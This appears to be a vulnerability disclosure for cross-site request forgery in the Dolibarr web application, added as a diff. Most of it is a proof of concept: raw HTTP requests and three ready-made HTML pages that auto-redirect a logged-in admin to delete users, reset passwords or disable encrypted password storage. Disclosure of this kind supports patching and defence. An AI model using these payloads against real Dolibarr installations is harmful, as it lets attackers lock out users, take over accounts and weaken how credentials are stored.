@@ -1,0 +1,83 @@
+
+CVE
+
+A cross-site requestt forgery (CSRF) exists in Dolibarr web applicattion via (1)dolibarr/user/card.php (2)dolibarr/admin/security.php Technical details (1)It is possible to disable users in dolibarr/user/card.php?id=&action=confirm_delete&confirm=yes (2)It is possible to change any user password randomly via dolibarr/user/card.php?id=&action=confirm_password&confirm=yes And (3)it is possible to change encrypt password storage to off via dolibarr/admin/security.php?action=disable_encrypt
+PoC
+
+1. Login as admin in dolibarr
+
+2. Acess malicious html
+
+3. (2)Dolibarr shows change password mensage, or (1)display a blocked user page or (3) displays security.php password section with encrypt passwords option not active.
+Requests:
+PASSWORD CHANGE:
+
+	GET //dolibarr/user/card.php?id=1&action=confirm_password&confirm=yes HTTP/1.1
+	Host: 192.168.0.38
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Cookie: DOLSESSID_e2aca549f9fb910136e2c5a57106c533=luvkqnk8nuflu0f2s1l3ls2dr6
+	Connection: close
+	Upgrade-Insecure-Requests: 1
+	
+
+USER_DELETE:
+
+	GET //dolibarr/user/card.php?id=4&action=confirm_delete&confirm=yes HTTP/1.1
+	Host: 192.168.0.38
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Cookie: DOLSESSID_e2aca549f9fb910136e2c5a57106c533=luvkqnk8nuflu0f2s1l3ls2dr6
+	Connection: close
+	Upgrade-Insecure-Requests: 1
+	
+
+ENCRYPT OFF:
+
+	GET /dolibarr/admin/security.php?action=disable_encrypt HTTP/1.1
+	Host: 192.168.0.38
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Cookie: DOLSESSID_3c071dde413ff064ded0e262ad65ab72=prgesc0ocgnceo9oiftm9uc0r1
+	Connection: close
+	Upgrade-Insecure-Requests: 1
+	
+
+Codes:
+USER_DELETE:
+
+	<html>
+	<head>
+		<title></title>
+		<meta http-equiv="refresh" content="5; url=http://192.168.0.38//dolibarr/user/card.php?id=4&action=confirm_delete&confirm=yes">
+	</head>
+	</html>
+
+PASSWORD CHANGE:
+
+	<html>
+	<head>
+		<meta http-equiv="refresh" content="5; url=http://192.168.0.38//dolibarr/user/card.php?id=1&action=confirm_password&confirm=yes"&gt
+	</head>
+
+	<body></body>
+	</html>
+
+ENCRYPT OFF:
+
+	<html>
+	<head>
+		<title></title>
+		<meta http-equiv="refresh" content="5; url=http://192.168.0.18/dolibarr/admin/security.php?action=disable_encrypt">
+	</head>
+	<body>
+
+	</body>
+	</html>
+
